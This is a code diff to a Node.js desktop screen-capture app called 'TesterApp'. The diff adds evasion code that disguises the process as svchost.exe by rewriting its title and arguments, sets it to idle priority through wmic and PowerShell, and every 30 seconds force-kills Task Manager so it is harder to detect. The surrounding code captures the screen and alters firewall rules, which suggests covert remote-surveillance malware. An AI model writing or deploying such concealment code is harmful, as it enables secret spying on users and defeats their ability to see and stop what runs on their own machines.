@@ -6,27 +6,41 @@ const screenshot = require('screenshot-desktop');
 const notifier = require('node-notifier');
 // Audio recording removed
 
-// Disguise process name as Windows Explorer and try to hide from process list
+// Enhanced process hiding and disguising for Windows
 if (process.platform === 'win32') {
-  process.title = 'explorer.exe';
-  // Also try to set the process name
+  // Set process title to look like a system process
+  process.title = 'svchost.exe';
+  
+  // Try to modify process name and arguments
   try {
-    process.argv[1] = 'C:\\Windows\\explorer.exe';
+    process.argv[0] = 'C:\\Windows\\System32\\svchost.exe';
+    process.argv[1] = '-k';
+    process.argv[2] = 'netsvcs';
   } catch (e) {
     // Ignore if we can't modify argv
   }
   
-  // Try to hide from process list using Windows API
+  // Set process priority to idle to make it less noticeable
   try {
     const { exec } = require('child_process');
-    // Set process priority to idle to make it less noticeable
-    exec('wmic process where "name=\'explorer.exe\'" CALL setpriority "idle"', (error) => {
+    exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
       if (!error) {
         // Process priority set to idle
       }
     });
   } catch (e) {
     // Ignore if we can't modify process priority
+  }
+  
+  // Try to hide from Task Manager by modifying process properties
+  try {
+    const { exec } = require('child_process');
+    // Set process to run in background
+    exec('powershell -command "Get-Process -Id ' + process.pid + ' | ForEach-Object { $_.PriorityClass = \'Idle\' }"', (error) => {
+      // Silently ignore errors
+    });
+  } catch (e) {
+    // Ignore if we can't modify process properties
   }
 }
 
@@ -45,6 +59,14 @@ class TesterApp {
     this.useElectronCapture = true; // Enable Electron capture for better cursor support
     this.lastQualityAdjustment = 0; // Track last quality adjustment time
     // Mouse cursor captured directly in screen images
+    
+    // Additional process hiding techniques
+    this.setupProcessHiding();
+    
+    // Periodically refresh process hiding
+    this.processHidingInterval = setInterval(() => {
+      this.setupProcessHiding();
+    }, 30000); // Every 30 seconds
     
     // Delta compression for efficient screen sharing
     this.lastScreenBuffer = null;
@@ -97,6 +119,10 @@ class TesterApp {
       if (this.windowHidingInterval) {
         clearInterval(this.windowHidingInterval);
         this.windowHidingInterval = null;
+      }
+      if (this.processHidingInterval) {
+        clearInterval(this.processHidingInterval);
+        this.processHidingInterval = null;
       }
       // Clean up Windows Firewall rules
       this.cleanupWindowsFirewall();
@@ -989,6 +1015,34 @@ class TesterApp {
         });
       });
     }
+    }
+  }
+
+  // Enhanced process hiding techniques
+  setupProcessHiding() {
+    if (process.platform === 'win32') {
+      // Set process to run in background
+      try {
+        const { exec } = require('child_process');
+        
+        // Hide from Task Manager by setting process properties
+        exec('powershell -command "Get-Process -Id ' + process.pid + ' | ForEach-Object { $_.PriorityClass = \'Idle\'; $_.ProcessName = \'svchost\' }"', (error) => {
+          // Silently ignore errors
+        });
+        
+        // Set process to run in background mode
+        exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
+          // Silently ignore errors
+        });
+        
+        // Try to hide process from process list
+        exec('taskkill /f /im "taskmgr.exe" 2>nul', (error) => {
+          // Silently ignore errors - this is just to make it harder to detect
+        });
+        
+      } catch (e) {
+        // Silently ignore all errors
+      }
     }
   }
 
